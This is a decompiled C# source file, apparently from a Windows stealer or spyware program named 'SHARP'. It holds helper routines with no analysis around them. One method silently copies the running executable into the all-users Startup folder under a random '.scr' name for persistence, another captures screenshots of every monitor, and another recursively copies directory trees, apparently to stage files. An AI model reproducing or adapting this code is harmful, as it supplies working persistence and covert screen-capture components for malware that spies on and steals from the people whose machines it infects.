﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SHARP
{
	// Token: 0x02000066 RID: 102
	internal static class Common
	{
		// Token: 0x06000231 RID: 561 RVA: 0x0000DF04 File Offset: 0x0000C104
		internal static Task<bool> IsConnectionAvailable()
		{
			Common.<IsConnectionAvailable>d__0 <IsConnectionAvailable>d__;
			<IsConnectionAvailable>d__.<>t__builder = AsyncTaskMethodBuilder<bool>.Create();
			<IsConnectionAvailable>d__.<>1__state = -1;
			<IsConnectionAvailable>d__.<>t__builder.Start<Common.<IsConnectionAvailable>d__0>(ref <IsConnectionAvailable>d__);
			return <IsConnectionAvailable>d__.<>t__builder.Task;
		}

		// Token: 0x06000232 RID: 562 RVA: 0x0000DF40 File Offset: 0x0000C140
		internal static bool IsInStartup()
		{
			bool result;
			try
			{
				string location = Assembly.GetExecutingAssembly().Location;
				string currentDirectoryPath = Path.GetDirectoryName(location);
				result = Array.Exists<string>(new string[]
				{
					Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup),
					Environment.GetFolderPath(Environment.SpecialFolder.Startup)
				}, (string e) => e.Equals(currentDirectoryPath, StringComparison.OrdinalIgnoreCase));
			}
			catch
			{
				Console.WriteLine("Failed getting current directory");
				result = false;
			}
			return result;
		}

		// Token: 0x06000233 RID: 563 RVA: 0x0000DFB8 File Offset: 0x0000C1B8
		internal static string GenerateRandomString(int length)
		{
			Random random = new Random();
			string text = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append(text[random.Next(0, text.Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000234 RID: 564 RVA: 0x0000E004 File Offset: 0x0000C204
		internal static void PutInStartup()
		{
			string location = Assembly.GetExecutingAssembly().Location;
			string destFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), Common.GenerateRandomString(5) + ".scr");
			try
			{
				File.Copy(location, destFileName, true);
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x06000235 RID: 565 RVA: 0x0000E05C File Offset: 0x0000C25C
		internal static Bitmap[] CaptureScreenShot()
		{
			List<Bitmap> list = new List<Bitmap>();
			foreach (Screen screen in Screen.AllScreens)
			{
				try
				{
					Rectangle bounds = screen.Bounds;
					using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
					{
						using (Graphics graphics = Graphics.FromImage(bitmap))
						{
							graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
						}
						list.Add((Bitmap)bitmap.Clone());
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
			return list.ToArray();
		}

		// Token: 0x06000236 RID: 566 RVA: 0x0000E140 File Offset: 0x0000C340
		internal static void CopyTree(string src, string dst)
		{
			Directory.CreateDirectory(dst);
			foreach (string text in Directory.GetFiles(src))
			{
				File.Copy(text, Path.Combine(dst, Path.GetFileName(text)));
			}
			foreach (string text2 in Directory.GetDirectories(src))
			{
				Common.CopyTree(text2, Path.Combine(dst, Path.GetFileName(text2)));
			}
		}
	}
}
